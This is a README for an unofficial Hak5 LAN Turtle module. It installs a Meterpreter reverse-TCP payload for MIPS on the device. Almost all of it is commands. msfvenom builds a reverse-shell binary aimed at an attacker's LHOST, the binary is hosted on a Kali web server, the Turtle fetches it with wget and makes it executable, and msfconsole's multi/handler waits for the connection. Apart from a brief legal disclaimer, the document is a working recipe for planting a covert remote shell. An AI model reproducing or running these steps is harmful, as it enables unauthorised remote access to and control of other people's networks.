## Unofficial custom Hak5 LAN Turtle Module - meterpreter-mipsbe-reverse-tcp

#### LEGAL DISCLAMER
    The author does not hold any responsibility for the use of this module. Remember that attacking
    targets without prior consent is illegal and punished by law. So use this module responsibly.

#### DOWNLOAD/INSTALL

**1 - On LAN Turtle: download module from github**<br />
<br />
`wget https://raw.githubusercontent.com/ATTACKnDEFEND/LanTurtle/main/meterpreter-mipsbe-reverse-tcp -O
/etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
<br />
`chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />

**3 - On Kali: generate Meterpreter payload with Msfvenom**<br />
<br />
`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > meterpreter-mipsbe-reverse-tcp`<br />
<br />
`sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />

**4 - On LAN Turtle: transfer Meterpreter payload**<br />
<br />
`wget <KALI IP>/meterpreter-mipsbe-reverse-tcp -O /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
<br />
`chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />

**5 - On Kali: start Meterpreter listerner**<br />
`sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/mipsbe/meterpreter_reverse_tcp;set lhost <LHOST>;set LPORT <LPORT>;exploit -j"`<br />







